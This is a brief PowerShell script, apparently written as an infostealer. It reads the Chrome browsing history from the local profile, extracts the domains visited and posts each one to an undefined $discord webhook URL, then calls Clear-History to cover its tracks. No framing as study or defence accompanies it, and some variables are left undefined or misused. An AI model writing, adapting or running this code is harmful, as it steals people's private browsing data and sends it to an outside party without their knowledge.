$history = Get-Content -Path "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\history" -encoding utf8 | Select-String -Pattern '(htt(p|ps))://([\w-]+\.)+[\w-]+(/[\w- ./?%&=]*)*?' -AllMatches

$decoded = 
Foreach ($entry in $history){

	Foreach($subentry in $entry){
		$url = $entry
		$domain = $url -replace 'http:\/\/','' -replace 'https:\/\/','' -replace '\/.*',''
		Write-Host "Entry: " $domain
		Invoke-RestMethod -ContentType 'Application/Json' -Uri $discord -Method Post -Body ($domain | ConvertTo-Json)
	}
}


Clear-History
